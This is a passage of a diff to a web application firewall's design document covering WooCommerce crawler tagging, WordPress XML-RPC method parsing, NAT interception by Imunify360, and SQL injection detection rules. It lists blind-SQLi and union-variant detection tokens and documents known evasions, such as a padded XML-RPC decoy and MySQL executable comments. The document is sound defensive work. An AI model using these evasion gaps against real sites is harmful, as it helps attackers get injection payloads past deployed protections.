+self-declared bot UA); `NO_REFERER` (not a self-declared bot, no Referer, no
+same-site Fetch Metadata); `XSITE` (a browser UA with another site's Referer,
+possibly a person).
 
-The rest came from rotating residential addresses with a plain browser UA, one
-or two requests each. That is the pattern Imunify360's ModSecurity rule "GET
-add-to-cart flood pattern" catches behind the edge (7 082 addresses in two
-days on earth), and per-IP counting never sees it. On mars these requests
-cost ~37 hours of backend time a day.
+**Stands down** for a shopper's click (a same-site Referer, or `Sec-Fetch-Site`
+same-origin / same-site) and for a WooCommerce session or WordPress login
+cookie, whatever the UA: an in-app browser can carry a crawler token, and a
+person's click must never be tagged a crawler's. Same-site = the host or a
+name under it, ignoring a leading `www.`, never its parent or a sibling under
+a public suffix. The product page's own form POSTs `add-to-cart` in the body
+and is out of scope.
 
-**Fires on** a `GET` / `HEAD` whose query string carries `add-to-cart` (read
-as PHP reads the name, so `add%2Dto%2Dcart` counts) with a value holding a
-digit, and tags the client:
-- `CRAWLER`: a self-declared bot UA;
-- `NO_REFERER`: not a self-declared bot (a browser UA, an in-app browser
-  such as Pinterest's, or no UA at all), no Referer, no same-site Fetch
-  Metadata;
-- `XSITE`: a browser UA with another site's Referer (an ad, a comparison
-  site, an email: possibly a person).
+**Not covered.** Every input is client-authored: a crawler forging a same-site
+Referer or the cookie name is not counted. Acceptable for a cost signal, and
+why no tag may key enforcement by itself. Bypass-list crawlers skip the WAF at
+Step 0 and are not measured.
 
-**Stands down** for a shopper's click (a same-site Referer, `www.` or not, or
-`Sec-Fetch-Site` same-origin / same-site under a no-referrer policy) and for a
-client with a WooCommerce session or a WordPress login cookie, whatever the
-UA: an in-app browser can carry a crawler token (the Pinterest app's UA names
-Pinterest), and a person's click must never be tagged a crawler's. A
-same-site Referer is, after a leading `www.` is dropped from both, the host
-itself or a name under it (`m.`), never its parent (a bare `gr` or `com.gr`)
-and never a sibling under a public suffix. The name is matched as PHP reads it,
-case-sensitively (`ADD-TO-CART` adds nothing to a cart). The product page's
-own form POSTs `add-to-cart` in the body and is out of scope.
+**Order.** Runs after every other rule, 612 included (its residential clients
+are 612's population; ahead of it 530 took their headline and push). Count
+530 from the headline and from `also_rule_ids`. **Push window:** the tag stays
+in the push key and the window is an hour (`PUSH_COOLDOWN_FAMILY`, logonly
+tier only): at ~1 request per IP per minute a 60 s window pushed ~80 k history
+rows a day on mars. The burn-in counts clients per hour, not requests.
 
-**Limits.** Every input is client-authored: a crawler that forges a same-site
-Referer, or presents a cookie by that name, is not counted. That is acceptable for a
-cost signal and is why no tag may key enforcement by itself. Crawlers on the
-bypass list (Googlebot, Bingbot, ...) skip the WAF at Step 0 and are not
-measured here.
-
-**Order.** It runs after every other rule, 612 (the fetch-metadata tell)
-included. cfm.lua pushes only the headline hit, and the residential clients
-here are 612's population too: ahead of 612 it took their headline and their
-push. When both match, 612 owns the headline and 530 is in `also_rule_ids`,
-so count 530 from the headline and from `also_rule_ids`.
-
-**Push window.** The tag stays in the push key (`PUSH_KEY_KEEPS_TAG`), so
-the burn-in can compare the three populations per IP, and the window is an
-hour, not 60 s (`PUSH_COOLDOWN_FAMILY`, logonly tier only: a promoted rule
-keeps the normal window). These clients send about one request
-per IP per minute, so a 60 s window pushed nearly every hit (~80 k history
-rows a day on mars). The burn-in counts clients per hour, not requests.
-
-**What next.** After the burn-in (`waf_activity` / `cfm.waf.log`,
-`node="all"`), the likely action for `CRAWLER` is not a block. It is an
-answer that skips the cart write: a 403, or a redirect to the same URL without
-`add-to-cart`. Any change ships per tag. No family block rule is planned, so
-`waf_security` never arms the family.
+**Next.** After the burn-in (`waf_activity` / `cfm.waf.log`, `node="all"`),
+the likely `CRAWLER` action is an answer that skips the cart write (a 403, or
+a redirect without `add-to-cart`), not a block, shipped per tag. No family
+block rule is planned, so `waf_security` never arms the family.
 
 ## XML-RPC rules (510-512) and the Jetpack carve-out
 
-510 (`system.multicall`) and 511 (`pingback.ping`) read the **method names** of
-an XML-RPC body as WordPress's IXR_Message reads them (`det.xmlrpc_method_names`,
-since 2026-10-09): one linear pass replays IXR's parser events — every start and
-end tag clears the text buffer, comments and processing instructions leave it,
-CDATA and character / predefined entity references add to it, `</methodName>`
-takes `trim(buffer)`, and a `>` inside a quoted attribute does not end a tag.
-Every name is checked (IXR calls the last). So `system&#46;multicall`, CDATA,
-comments, `junk<x/>system.multicall` and padding all read as WordPress reads
-them; before, the rules looked for the words in the first 2 KB of the body. The
-body-wide match on the first 2 KB stays (a multicall's own calls are strings in
-its params). The edge reads the first `waf_body_max_len` bytes (32 KB) of a
-body: a call cut there whose last visible method name is none (or is not one
-of the calls that carry a big body: `wp.uploadFile`, `metaWeblog.newMediaObject`,
-new / edit post, page or comment — a decoy, the real name past the cut) was
-padded past the edge, and is reported under 510 at `logonly`
-(`AUTH_WP_XMLRPC_HIDDEN_METHOD`, a burn-in before it blocks; every client writes
-the name in its first hundred bytes or so). So rule 510, a block-tier rule, has
-logonly hits too; they never feed autoblock. Rule 512 still counts those POSTs.
-**Known limit:** a decoy that *is* one of those big calls (`wp.uploadFile` up
-front, `system.multicall` past the cut — IXR calls the last name) reads as the
-big call, and neither 510 nor the hidden-method signal fires; only 512's rate
-limit applies. Closing it needs the part of the body past the cut (a plain
-`</methodName` count over it), which the edge does not keep today.
-Before reading, the reader drops one `<?xml…?>` from the first 100 bytes, as
-IXR does wherever it sits.
+Family `WAF_AUTH_BURST`, all `block`: 510 `system.multicall`, 511
+`pingback.ping`, 512 a POST rate (6 a minute per IP across the server's
+vhosts).
 
-**511 blocks, but does not ban** (since 2026-10-15). Its `waf_security` ban
-is held in code (`HoldAutoblock`, `RULE_511 = 0`): WordPress sends a
-`pingback.ping` itself (UA `The Incutio XML-RPC PHP Library -- WordPress/x`)
-when a post links to one of our sites, and the ban landed on the sender's
-shared hosting server, every port, for the section `BLOCK`. A UA carve-out was
-not an option (a one-line spoof, and `ALLOW_UA_CONTAINS` exempts every family).
-Like 10019/10020 the block is recorded after every armed block rule
-(`st.xmlrpc_pingback`), so a pingback carrying an armed payload (a serialized
-object, rule 329) is banned by that rule. A real pingback (the method IXR
-dispatches, the last `methodName`, is `pingback.ping`, in a body the edge saw
-whole: shorter than `waf_body_max_len` and no shorter than its
-Content-Length) that 511 stops (`block`, `challenge`, `challenge_v2`) never
-counts toward 512, as when its block ended evaluation at step 26, and leaves
-a 10 s IP decision (`block_ttl_sec`) instead of 30 min. Everything else still
-counts toward 512: the words carried as a param of another call, a decoy
-padded past the window or read short (the call IXR runs is behind the cut),
-and any pingback 511 lets through (`logonly`, excluded), which reaches
-WordPress, as before the hold. Botnet pingbacks (`PHP/6.x`, a PHP that never
-existed) get the same 403 and no ban. Decision record:
-`docs/waf-autoblock-design.md`.
+**510 / 511 read method names as WordPress's IXR_Message does**
+(`det.xmlrpc_method_names`, one linear pass over IXR's parser events, after
+dropping one `<?xml…?>` from the first 100 bytes). Every name is checked (IXR
+calls the last), so entities, CDATA, comments and padding read as WordPress
+reads them. The body-wide match on the first 2 KB stays (a multicall's calls
+are strings in its params).
 
-510-512 and the auth burst (501) skip Jetpack's own traffic
+**Padding.** The edge reads 32 KB (`waf_body_max_len`). A call cut there whose
+last visible method name is none, or not one of the big-body calls
+(`wp.uploadFile`, `metaWeblog.newMediaObject`, new / edit post, page or
+comment), was padded: 510 reports it at `logonly`
+(`AUTH_WP_XMLRPC_HIDDEN_METHOD`, burn-in before it blocks; clients write the
+name in the first hundred bytes or so). Those logonly 510 hits never feed
+autoblock; 512 still counts the POSTs. **Not covered:** a decoy that *is* a
+big call (`wp.uploadFile` up front, `system.multicall` past the cut) reads as
+the big call, and only 512 applies; closing it needs the body past the cut,
+which the edge does not keep.
+
+**511 blocks but does not ban** (`HoldAutoblock`, `RULE_511 = 0`): WordPress
+sends `pingback.ping` itself (UA `The Incutio XML-RPC PHP Library --
+WordPress/x`) when a post links to our sites, and the ban hit the sender's
+shared hosting server, every port. A UA carve-out was rejected (a one-line
+spoof; `ALLOW_UA_CONTAINS` exempts every family). The block is recorded after
+every armed block rule (`st.xmlrpc_pingback`), so a pingback carrying an armed
+payload (329) is banned by that rule. A real pingback (last `methodName` is
+`pingback.ping`, body seen whole) that 511 stops never counts toward 512 and
+leaves a 10 s IP decision (`block_ttl_sec`), not 30 min; anything else still
+counts. Decision record: `docs/waf-autoblock-design.md`.
+
+**Jetpack.** 510-512 and 501 skip Jetpack's own traffic
 (`is_known_legit_xmlrpc`): a Jetpack marker (`?for=jetpack`, a Jetpack /
-WordPress.com User-Agent, the word in the body) **from a Jetpack network**. The
-networks are the ranges Jetpack publishes (`https://jetpack.com/ips-v4.txt`, the
-same as its "Add Jetpack IPs to an Allowlist" page; eight IPv4 ranges, read
-2026-10-09). Before that a marker alone was enough, and any client could add
-one. If Jetpack changes its ranges, set them in `cfm_waf_config.lua`:
+WordPress.com UA, the word in the body) **from a Jetpack network**, the ranges
+in `https://jetpack.com/ips-v4.txt` (eight IPv4 ranges, read 2026-10-09). A
+marker alone is not enough (any client can add one). If Jetpack changes its
+ranges, set them in `cfm_waf_config.lua`:
 
 ```lua
 xmlrpc_jetpack_nets = { "192.0.64.0/18", "195.234.108.0/22", "..." },
 ```
 
-Until then a Jetpack request from a new address is an ordinary XML-RPC client
-(512 counts its POSTs: 6 a minute per IP across the server's vhosts).
+This is the one place the ranges are hard-coded: the traffic-rules xmlrpc
+lockdown preset (`rules-model.js`) takes them as operator input on purpose,
+since an allow rule there opens the whole path.
 
-The burst counters (501, 502's repeated HEAD, 512) are one atomic
-`cfm_shdict.incr` per window; the get-then-set pair before it lost increments
-between workers. A window under 1 s counts as 1 s, and the first hit only opens
-the window (a threshold of 1 still needs a second hit), as before.
-
-This list of ranges is the one place they are hard-coded: the traffic-rules
-xmlrpc lockdown preset (`rules-model.js`) takes them as an operator input on
-purpose, since an allow rule there opens the whole path to them; here they only
-narrow an exemption that used to need no network at all.
+**Counters.** The burst counters (501, 502's repeated HEAD, 512) are one
+atomic `cfm_shdict.incr` per window. A window under 1 s counts as 1 s, and the
+first hit only opens the window (a threshold of 1 still needs a second hit).
 
 ## Per-vhost rule exclusions
 
@@ -2304,38 +1598,36 @@ carrying enrichment (ASN / country) and the per-request forensic fields
  "asn":12345,"asn_name":"EXAMPLE-AS","country":"US"}
 ```
 
-The earlier split (compact text in `cfm.waf.log` + a sampled JSON in
-`cfm.waf.sampled.log`, gated by `CFM_WAF_SAMPLE_RATE`) is gone. Operators
-tail / grep `cfm.waf.log` directly for FP investigation.
-
 ### Cost / regression notes
 
 | Path | Cost | Notes |
 |---|---|---|
-| Per WAF check | ~3-5µs | Two shdict incr + one get-and-compare. <1% of WAF check cost. |
-| Per flush (~1/min cluster-wide) | ~3µs on the lock winner | Snapshot+RPC runs in `ngx.timer.at(0, …)`; RPC latency is 100% off the request path. |
-| Per WAF trigger | ~50µs | Forensic fields (UA / Referer / CT) attached on every push; JSON encode + one file write. |
-| `/api/v1/waf/hit-rates` | <100ms typical | `json_extract` is O(N events in window); operator-pulled, never on hot path. |
+| Per WAF check | ~3-5 µs | Two shdict incr + one get-and-compare; under 1% of the check. |
+| Per flush (~1/min cluster-wide) | ~3 µs on the lock winner | Snapshot + RPC run in `ngx.timer.at(0, …)`, off the request path. |
+| Per WAF trigger | ~50 µs | JSON encode of the forensic fields + one file write. |
+| `/api/v1/waf/hit-rates` | <100 ms typical | `json_extract` is O(events in window); operator-pulled, never on the hot path. |
 
 #### Body-aware scan path (php_wrappers / ssrf_proto / js_proto)
 
-Measured on bench host with the three body-aware rules enabled, running through `_M.check` end-to-end. "Plain JSON" = realistic JSON with no `%xx` sequences (the common case). "%-encoded" = body full of `%xx` escapes (forces the slow `url_decode_once` path).
+Measured through `_M.check` with the three body-aware rules on. "Plain JSON"
+has no `%xx` (the common case); "%-encoded" forces the `url_decode_once` slow
+path.
 
 | Body | Content-Type | Effective cap | Per-request CPU |
 |---|---|---|---|
-| 2 KB plain JSON | application/json | 2 KB (within budget) | ~10 µs |
-| 30 KB plain JSON | text/plain | 2 KB (truncated by `other` budget) | ~11 µs |
-| 30 KB plain JSON | application/json | 30 KB (`json` budget=32K) | ~71 µs |
-| 500 KB plain JSON | application/json | 32 KB (capped by `json` budget) | ~87 µs |
-| 30 KB %-encoded | application/json | 30 KB | ~0.6 ms (slow path: two table-driven gsub passes; ~1.5 ms with the per-escape decoder before 2026-10-09) |
+| 2 KB plain JSON | application/json | 2 KB | ~10 µs |
+| 30 KB plain JSON | text/plain | 2 KB (`other` budget) | ~11 µs |
+| 30 KB plain JSON | application/json | 30 KB (`json` budget 32K) | ~71 µs |
+| 500 KB plain JSON | application/json | 32 KB (`json` budget) | ~87 µs |
+| 30 KB %-encoded | application/json | 30 KB | ~0.6 ms (two table-driven gsub passes) |
 
-End-to-end ceiling is `CFM_WAF_BODY_MAX_LEN` (default 32768, `cfm_cfg.lua`), so the 32 KB JSON budget applies as is.
+The end-to-end ceiling is `CFM_WAF_BODY_MAX_LEN` (default 32768,
+`cfm_cfg.lua`). `normalize()` skips the gsub passes when the input has no `%`,
+which JSON / multipart bodies almost never carry.
 
-`normalize()` short-circuits when input contains no `%`, so the gsub passes only run when actual percent-encoding is present. JSON / multipart bodies almost never carry `%xx`, so the fast path covers the dominant case and dropped baseline cost ~12× vs the previous unconditional double-gsub.
-
-Backward compat: all new wire fields are `omitempty`; `CREATE TABLE IF NOT EXISTS` upgrades existing SQLite DBs silently.
-
-Kill switch: `CFM_WAF_STATS_ENABLE=0` disables hit-rate counters + flushing.
+Wire fields are `omitempty` and the table is `CREATE TABLE IF NOT EXISTS`, so
+upgrades need no migration. Kill switch: `CFM_WAF_STATS_ENABLE=0` disables the
+hit-rate counters and flushing.
 
 ---
 
@@ -2420,60 +1712,26 @@ Key invariants:
 
 ## Upstream interception — when traffic never reaches the WAF
 
-The WAF (and the challenge engine, and the edge access log) only see traffic
-that actually reaches the openresty/angie listener. In full-DNAT mode that
-path is: packet arrives on 80/443 → `inet cfm_redirect` prerouting DNATs it
-to 9080/9043 → edge proxy → `cfm.lua`. **Anything that diverts the packet
-before our DNAT chain runs makes it invisible to the entire L7 stack** — no
-access-log line, no WAF, no challenge — while the site keeps working, because
-whatever intercepted the packet still proxies it to Apache. This failure mode
-is completely silent; you only notice it when you go looking for log lines
-that aren't there.
-
-Things that run before (or instead of) our DNAT chain:
+The WAF, the challenge engine and the edge access log see only traffic that
+reaches the edge listener. In full-DNAT mode: packet on 80/443 →
+`inet cfm_redirect` prerouting DNATs it to 9080/9043 → edge proxy →
+`cfm.lua`. **Anything that diverts the packet before our DNAT chain hides it
+from the whole L7 stack** (no access-log line, no WAF, no challenge) while the
+site keeps working, because the interceptor still proxies to Apache. It is
+silent: you notice only by looking for log lines that are not there.
 
 | Interceptor | Where | Effect |
 |---|---|---|
 | Entries in `/etc/cfm/cfm.dnat_bypass` | `inet cfm_redirect` itself, accept before the dport rules | Listed source IPs go straight to Apache. See `docs/dnat-bypass.md`. |
-| **Imunify360 WebShield** | `ip nat` / `ip6 nat` PREROUTING at priority `dstnat` (-100), managed by iptables-nft | DNATs matched sources to WebShield's own listener, which proxies to Apache directly. Runs *before* `cfm_redirect` when CFM is at `dstnat + 1` (-99, the default "Imunify-first" mode). |
-| `NOTRACK` / `-j CT --notrack` rules in raw PREROUTING | priority raw (-300) | Untracked connections skip NAT entirely (NAT requires conntrack), so the packet lands raw on Apache:443. A classic side effect of "keep CDN traffic out of conntrack" scripts. |
+| **Imunify360 WebShield** | `ip nat` / `ip6 nat` PREROUTING at `dstnat` (-100), iptables-nft | DNATs matched sources (its `i360.ipv4.remote_proxy_static` set holds Cloudflare's ranges) to WebShield, which proxies to Apache. Runs *before* `cfm_redirect` when CFM is at `dstnat + 1` (-99, the default "Imunify-first" mode). |
+| `NOTRACK` / `-j CT --notrack` in raw PREROUTING | raw (-300) | Untracked connections skip NAT, so the packet lands on Apache:443. A side effect of "keep CDN traffic out of conntrack" scripts. |
 
-### Case study — Cloudflare-fronted vhosts vanish from the edge log (2026-08-04)
-
-**Symptom.** On a cPanel host running both CFM (DNAT mode) and Imunify360,
-domains whose DNS is on Cloudflare (orange-cloud proxied) produced *zero*
-openresty access-log lines. The same request forced to the origin IP was
-logged and WAF-inspected normally:
-
-```bash
-curl "https://example-shop.gr/?q=..." --resolve "example-shop.gr:443:84.54.49.204"
-# → logged; an XSS payload here even got the CFM challenge page
-
-curl "https://example-shop.gr/?q=..."     # resolves to Cloudflare edge
-# → site works, but NOT logged. No WAF. No challenge.
-```
-
-First suspicion was an operator "whitelist Cloudflare" script feeding CF
-ranges into `cfm.dnat_bypass` — wrong, the file was empty and
-`nft list table inet cfm_redirect` showed a clean chain. The real chain of
-events:
-
-1. CFM ran at the default priority `dstnat + 1` (-99): the documented
-   **Imunify-first fallback mode** (`cfm dnat` prints exactly this).
-2. Imunify360's iptables-nft nat PREROUTING sits at `dstnat` (-100) and
-   its WebShield intercepts traffic whose *source* is in its known-proxy
-   ipset — `i360.ipv4.remote_proxy_static` — which contains the Cloudflare
-   ranges.
-3. So every packet arriving *via Cloudflare* was DNAT'd to WebShield at
-   -100. By the time `cfm_redirect` ran at -99, the dport was no longer
-   80/443, our `tcp dport 443 dnat to :9043` didn't match, and WebShield
-   proxied straight to Apache. Direct traffic (not in any i360 set) fell
-   through -100 untouched and was caught by us at -99 — hence the
-   asymmetry.
-
-Nothing was misconfigured in `openresty.conf`/`angie.conf` — realip from
-`CF-Connecting-IP` + `trusted_proxies.conf` were correct and simply never
-got the chance to run.
+**Seen in production (2026-08-04).** On a cPanel host with CFM (DNAT, -99)
+and Imunify360, Cloudflare-proxied domains produced no edge log lines, while
+the same request forced to the origin IP (`curl --resolve`) was logged and
+inspected. WebShield took every Cloudflare-sourced packet at -100; by -99 the
+dport was no longer 80/443. `cfm.dnat_bypass` was empty and the edge conf
+(realip from `CF-Connecting-IP`, `trusted_proxies.conf`) was correct.
 
 ### Diagnosis recipe
 
@@ -2505,43 +1763,33 @@ ss -tnp | grep <cdn-edge-ip>
 
 ### Remedies
 
-Pick who fronts web traffic — the two stacks cannot both do it for the same
-packet:
+Pick who fronts web traffic; both stacks cannot do it for the same packet.
 
-- **CFM-first:** set `NFT_DNAT_PRIORITY = -101` in `/etc/cfm/cfm.conf`, then
-  `cfm dnat on` (or restart cfm, which re-installs the chain at the new
-  priority). A bare `cfm dnat on --priority -101` works too but lasts only
-  until the next restart, reboot or failsafe recovery, which all apply
-  cfm.conf's value. CFM DNATs 80/443 before
-  Imunify's chain at -100; ALL traffic (including CDN-sourced) flows through
-  openresty → full logging/WAF/challenge, with the real client IP restored
-  from `CF-Connecting-IP`. Trade-off: WebShield effectively stops seeing web
-  traffic; CFM's challenge layer replaces its graylist challenge on 80/443.
-- **Imunify-first (priority -99, the default):** accept that CDN-sourced
-  traffic is served and logged by WebShield, not by CFM. This is by design
-  in this mode — do not chase it as a CFM logging bug.
-- Disabling WebShield (`imunify360-agent config update
-  '{"WEBSHIELD": {"enable": false}}'`) removes the -100 interception while
-  keeping the rest of Imunify, letting CDN traffic fall through to CFM even
-  at -99.
+- **CFM-first:** `NFT_DNAT_PRIORITY = -101` in `/etc/cfm/cfm.conf`, then
+  `cfm dnat on` (or restart cfm). A bare `cfm dnat on --priority -101` lasts
+  only until the next restart, reboot or failsafe recovery, which apply
+  cfm.conf's value. All traffic, CDN-sourced included, then flows through the
+  edge with the real client IP from `CF-Connecting-IP`. WebShield stops
+  seeing web traffic; CFM's challenge replaces its graylist challenge on
+  80/443. `edge_health` check H (`web-dnat-order`) warns when a DNAT runs
+  ahead while WebShield serves real traffic.
+- **Imunify-first (-99, the default):** CDN-sourced traffic is served and
+  logged by WebShield, not CFM. By design in this mode, not a CFM logging bug.
+- **Disable WebShield** (`imunify360-agent config update
+  '{"WEBSHIELD": {"enable": false}}'`): removes the -100 interception and
+  keeps the rest of Imunify, so CDN traffic reaches CFM even at -99.
 
-**"Never block Cloudflare" done right.** The legitimate operator goal —
-never L4-block/challenge a CDN edge IP (thousands of innocent sites share
-it) while still knowing the real client — does *not* need any
-prerouting/NAT-level exemption. The CDN traffic *should* pass through the
-edge proxy:
-
-- L4 never-block: put the CDN ranges in `cfm.ignore` / `cfm.allow`. Those
-  render in the **input** chain only (`nft.go` early rules) — they cannot
-  divert or hide traffic from the WAF.
-- Real client IP: already handled at the edge by `real_ip_header
-  CF-Connecting-IP` + `trusted_proxies.conf`; scoring, challenge and WAF
-  decisions then apply to the real client, not the CDN edge IP.
-- Do **not** put CDN ranges in `cfm.dnat_bypass` (that's for cluster peers /
-  WHM transfer sources — see `docs/dnat-bypass.md`) and do not exempt them
-  from NAT/conntrack: either one silently disables L7 inspection for every
-  request arriving via the CDN — an attacker only has to put a domain
-  behind Cloudflare to bypass the WAF.
+**"Never block Cloudflare" done right** needs no NAT-level exemption; CDN
+traffic *should* pass through the edge:
+- L4 never-block: CDN ranges in `cfm.ignore` / `cfm.allow`, which render in the
+  **input** chain only and cannot hide traffic from the WAF.
+- Real client IP: `real_ip_header CF-Connecting-IP` + `trusted_proxies.conf`
+  at the edge; scoring, challenge and WAF then apply to the client.
+- **Never put CDN ranges in `cfm.dnat_bypass`** (it is for cluster peers /
+  WHM transfer sources, `docs/dnat-bypass.md`), and never exempt them from
+  NAT / conntrack: either silently disables L7 inspection for every request
+  via the CDN, so an attacker only has to put a domain behind Cloudflare to
+  bypass the WAF.
 
 ---
 
@@ -2611,166 +1859,108 @@ return {
 
 ---
 
-## SQLi blind-family expansion + body scan (rules 301 / 309, 2026-06-26)
+## SQLi blind-family expansion + body scan (rules 301 / 309)
 
-Source workload: a sqlmap scan against the **WHMCS ticket form** (myip.gr
-support) — hundreds of tickets, one per payload, all submitted in the
-`application/x-www-form-urlencoded` **body**.
+**Why.** A sqlmap scan against the WHMCS ticket form (myip.gr support):
+hundreds of tickets, one per payload, all in the urlencoded **body**, which
+`rule_sqli` did not read.
 
-Three changes shipped together:
-
-1. **`rule_sqli` is now body-aware.** It previously scanned only `uri+args`
-   (`get_scan_ua()`); form-field SQLi in the POST body was invisible. Both
-   SQLi rules now *also* run over the budgeted `args+body` string
-   (`get_norm_ab()`) on POST requests (`cfm_waf.lua` §21 / §21b).
-2. **Time-based / boolean / error-based blind family** is now detected,
-   split across two confidence tiers (`cfm_waf_detectors.lua`):
-   - **Rule 301 `rule_sqli` (`WAF_SQLI`, shipped `challenge`, now `block`)** — `SQLI_BLIND_TOKENS`,
-     the **DBMS-unique** primitives that collide with no ordinary word:
-     MSSQL `waitfor delay|time`; PostgreSQL `pg_sleep`; Oracle
-     `dbms_pipe.receive_message`/`dbms_lock.sleep`; MySQL `now()=sysdate()` /
-     `rlike sleep(` / `select sleep(` / `select(sleep(`; error-based `exp(~`;
-     plus the boolean tail `=0+0+0+1`.
-   - **Rule 309 `rule_sqli_blind_lexical` (`WAF_SQLI_LEXICAL`, shipped `logonly`, now `block`)** —
-     `SQLI_LEXICAL_TOKENS`, the tokens that are real SQLi primitives **but
-     also collide case-insensitively with legitimate code/content**:
-     `benchmark(`, `extractvalue(` (=camelCase `extractValue(` in XML
-     parsers/JS/Java), `updatexml(` (`updateXml(`), `floor(rand(` (valid
-     PHP), `randomblob(` (`randomBlob(`), and the shell/code-prose forms
-     `or sleep(` / `and sleep(` / `,sleep(` / `(sleep(`. **Observe-only** so a
-     legit XML parser / updater / custom script can't be broken.
-3. Tokens match a whitespace/`+`-collapsed scan string so a form-urlencoded
-   space (`+` or `%20`) still hits the spaced tokens.
+**What shipped (2026-06-26):**
+1. Both SQLi rules also run over the budgeted `args+body` string
+   (`get_norm_ab()`) on POST requests (`cfm_waf.lua` §21 / §21b), not only
+   `uri+args` (`get_scan_ua()`).
+2. The time-based / boolean / error-based blind family, split by confidence
+   (`cfm_waf_detectors.lua`):
+   - **301 `rule_sqli`** (`WAF_SQLI`, `block`): `SQLI_BLIND_TOKENS`, the
+     DBMS-unique primitives no ordinary word collides with: MSSQL
+     `waitfor delay|time`; PostgreSQL `pg_sleep`; Oracle
+     `dbms_pipe.receive_message` / `dbms_lock.sleep`; MySQL `now()=sysdate()`
+     / `rlike sleep(` / `select sleep(` / `select(sleep(`; error-based `exp(~`;
+     the boolean tail `=0+0+0+1`.
+   - **309 `rule_sqli_blind_lexical`** (`WAF_SQLI_LEXICAL`, `block`):
+     `SQLI_LEXICAL_TOKENS`, real primitives that also collide
+     case-insensitively with legit code: `benchmark(`, `extractvalue(`
+     (camelCase `extractValue(`), `updatexml(`, `floor(rand(` (valid PHP),
+     `randomblob(`, and `or sleep(` / `and sleep(` / `,sleep(` / `(sleep(`.
+     Kept separate so this word-colliding set could ship observe-only first.
+3. Tokens match a whitespace/`+`-collapsed string, so a form-urlencoded space
+   (`+` or `%20`) still hits the spaced tokens.
 
 Tests: `scripts/tests/cfm_waf_sqli_test.lua` (captured payloads, per-DBMS
 family, per-rule isolation, FP negatives).
 
-### Rule 319 `rule_sqli_union_variant` (`WAF_SQLI_UNION_VARIANT`, shipped `logonly`, now `challenge_v2`) — 2026-07-08
+### Rule 319 `rule_sqli_union_variant` (`WAF_SQLI_UNION_VARIANT`, `challenge_v2`)
 
-Rule 301 catches `union select` only when the two keywords are *adjacent*
-(after `+`/whitespace collapse). Four common obfuscations slip through that
-adjacency check because a word or punctuation sits **between** the keywords:
-
-| Variant | Example payload | Why 301 misses it |
-|---|---|---|
-| `union all select` | `1 union all select …` | `all` between the keywords |
-| `union distinct select` | `1 union distinct select …` | `distinct` between the keywords |
-| `union(select` | `1 union(select …` | `(` between the keywords |
-| `union/**/select` | `1 union/**/select …` | comment collapses to `unionselect`, not `union select` |
-| `union/**/all/**/select` | `1 union/**/all/**/select …` | collapses to `unionallselect` / `uniondistinctselect` |
-
-Rule 319 (`detect_sqli_union_variant` in `cfm_waf_detectors.lua`) matches
+301 catches `union select` only when the keywords are adjacent after the
+`+`/whitespace collapse. 319 (`detect_sqli_union_variant`) matches
 `union<mid>select` for `mid` ∈ {` all `, ` distinct `, `(`, ``, `all`,
-`distinct`} on the same comment-stripped, `+`/whitespace-collapsed scan string
-301 uses. It carries the **same value-terminator guard** as the 301
-`+`-bypass fix — the `union` must be immediately preceded by a value break
-(`[%d'"%)]`) or a SQL operand keyword (`null`/`true`/`false`) — so legitimate
-prose like *"credit union all selected"* or *"european union distinct
-selection"* does **not** fire.
+`distinct`} on the same comment-stripped, collapsed string: `union all
+select`, `union distinct select`, `union(select`, `union/**/select` (collapses
+to `unionselect`), `union/**/all/**/select`. Same value-terminator guard as
+301: `union` must follow a value break (`[%d'"%)]`) or an operand keyword
+(`null` / `true` / `false`), so prose like "credit union all selected" does
+not fire.
 
-**Tier: `logonly` (observe-only, never blocks).** Shipped 2026-07-08 for a
-**multi-day real-traffic burn-in**. Walk `cfm webtop waf hit-rates` (and grep
-`cfm.waf.log` for `WAF_SQLI_UNION_VARIANT`, grouping by `host`+`uri`) after
-2–4 days; if the window is clean, promote `logonly → challenge`, then after a
-further clean window `challenge → block` — never `logonly → block` directly.
-Because 301 already blocks the adjacent form and its family auto-arms
-`waf_security`, keep 319 un-armed for autoblock (default `0`, logonly) until
-it has earned a block-tier promotion of its own.
+**Mode.** Shipped `logonly` (2026-07-08), promoted to `challenge` and then
+`challenge_v2` (2026-09-23) on pure sqlmap-style attack traffic. Its autoblock
+stays un-armed until it earns a block promotion of its own (301 already blocks
+the adjacent form).
 
-**Expected FP sources to weigh during the burn-in** (from the 2026-07
-adversarial review — all are logonly *log lines*, never blocks): a camelCase
-identifier in a JSON/form body whose value quote is the terminator —
-`{"widget":"unionSelect"}` / `unionAllSelect` collapses to
-`unionselect`/`unionallselect`; SQL-tutorial or DBA-forum content *about* the
-keyword (`"UNION ALL SELECT vs plain UNION"`); relational-algebra notation
-(`(R1)union(select…)`); and a technical **search box** where a browser sends
-`?q=PostgreSQL 12 union all select …` with a digit terminator. If any of these
-show up materially in `cfm.waf.log`, tighten before promoting past `logonly`
-(e.g. drop the empty-/`all`-/`distinct`-collapsed camelCase branches, which are
-the FP-prone ones) rather than shipping the noise to `challenge`.
+**FP sources to watch** (from review): a camelCase identifier whose value
+quote is the terminator (`{"widget":"unionSelect"}` / `unionAllSelect`); SQL
+tutorial or DBA-forum content about the keyword; relational-algebra notation
+(`(R1)union(select…)`); a technical search box (`?q=PostgreSQL 12 union all
+select …`). If they show up, drop the empty- / `all`- / `distinct`-collapsed
+camelCase branches (the FP-prone ones) rather than living with the noise.
 
-**Known gaps (documented, not closed here):** a MySQL version-gated executable
-comment `/*!50000union*/select` is stripped whole (the `union` disappears) — it
-also bypasses **rule 301**, so it belongs to a shared `strip_sql_comments`
-follow-up, not this rule; a backtick identifier-break (`` `col`union all
-select ``) is rejected because `` ` `` is not in the shared terminator class
-(again shared with 301); asymmetric single-side comments (`union/**/all
-select` → `unionall select`) and the `all`+paren combo (`union all(select`)
-are rarer stacked obfuscations; and a **value-leading** `?p=union all select…`
-(only `=` before `union`) is a *deliberate* miss to avoid noun-phrase FPs
-(same trade-off as rule 301). These are burn-in-visibility gaps, not new
-block-path holes — 301 still blocks the adjacent form.
+**Not covered:** a MySQL executable comment `/*!50000union*/select` (stripped
+whole; also bypasses 301, a shared `strip_sql_comments` follow-up); a
+backtick identifier break (`` `col`union all select ``, `` ` `` is not in the
+shared terminator class); asymmetric single-side comments (`union/**/all
+select`) and `union all(select`; a value-leading `?p=union all select…` (only
+`=` before `union`), a deliberate miss to avoid noun-phrase FPs, as in 301.
+None is a new block-path hole: 301 still blocks the adjacent form.
 
-> ### ✅ FP review — DONE 2026-09-05 (rule 101 promoted)
-> A 6-server, 7-day review of `WAF_TRAVERSAL` (rule 101, `detect_traversal`)
